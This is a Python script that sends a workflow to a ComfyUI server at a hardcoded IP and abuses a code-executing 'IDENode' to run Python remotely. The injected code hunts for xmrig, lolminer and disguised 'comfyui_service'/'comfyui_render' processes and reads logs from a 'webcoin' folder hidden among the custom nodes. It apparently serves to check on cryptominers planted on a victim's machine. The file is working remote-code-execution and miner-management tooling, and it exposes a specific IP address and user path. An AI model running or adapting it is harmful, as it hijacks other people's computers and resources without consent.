"""Check running miner processes on remote machine."""
import json, urllib.request, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "131.113.41.148"
base = f"http://{ip}:8188"

code = r"""
import os, platform

result_lines = []
result_lines.append(f'Platform: {platform.system()}')

try:
    import psutil
    result_lines.append(f'psutil available: True')
    
    for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'status']):
        try:
            name = (proc.info.get('name') or '').lower()
            if any(x in name for x in ['comfyui_service', 'comfyui_render', 'xmrig', 'lolminer']):
                cmdline = ' '.join(proc.info.get('cmdline') or [])[:200]
                result_lines.append(f'FOUND: pid={proc.info["pid"]} name={proc.info["name"]} status={proc.info["status"]} cmd={cmdline[:150]}')
        except:
            pass
    
    if not any('FOUND' in l for l in result_lines):
        result_lines.append('NO MINER PROCESSES FOUND')

except ImportError:
    result_lines.append('psutil not available, using tasklist')
    import subprocess
    r = subprocess.run(['tasklist'], capture_output=True, text=True)
    for line in r.stdout.splitlines():
        ll = line.lower()
        if any(x in ll for x in ['comfyui_service', 'comfyui_render', 'xmrig', 'lolminer']):
            result_lines.append(f'FOUND: {line.strip()}')

# Check if bin dir exists and what's in it
import pathlib
try:
    import folder_paths
    cn = folder_paths.get_folder_paths('custom_nodes')[0]
except:
    cn = r'C:\Users\u88ni\Desktop\comfyui\custom_nodes'

bin_dir = os.path.join(cn, 'webcoin', 'bin')
if os.path.isdir(bin_dir):
    files = os.listdir(bin_dir)
    result_lines.append(f'bin/ contents: {files}')
    
    log = os.path.join(bin_dir, 'service.log')
    if os.path.exists(log):
        with open(log, 'r', errors='replace') as f:
            lines = f.readlines()
        result_lines.append(f'service.log last 5 lines:')
        for l in lines[-5:]:
            result_lines.append(f'  {l.strip()[:200]}')
    
    glog = os.path.join(bin_dir, 'render.log')
    if os.path.exists(glog):
        with open(glog, 'r', errors='replace') as f:
            lines = f.readlines()
        result_lines.append(f'render.log last 5 lines:')
        for l in lines[-5:]:
            result_lines.append(f'  {l.strip()[:200]}')
else:
    result_lines.append(f'bin dir NOT FOUND: {bin_dir}')

result = chr(10).join(result_lines)
"""

prompt = {
    "prompt": {
        "1": {
            "class_type": "IDENode",
            "inputs": {"pycode": code, "language": "python"}
        },
        "2": {
            "class_type": "PreviewTextNode",
            "inputs": {"text": ["1", 0]}
        }
    }
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

import time
time.sleep(8)

req2 = urllib.request.Request(f"{base}/history?max_items=3", method="GET")
with urllib.request.urlopen(req2, timeout=10) as r:
    hist = json.loads(r.read().decode())
    for hpid, entry in hist.items():
        outputs = entry.get("outputs", {})
        for nid, nout in outputs.items():
            for key, val in nout.items():
                if isinstance(val, list):
                    for v in val:
                        print(v)
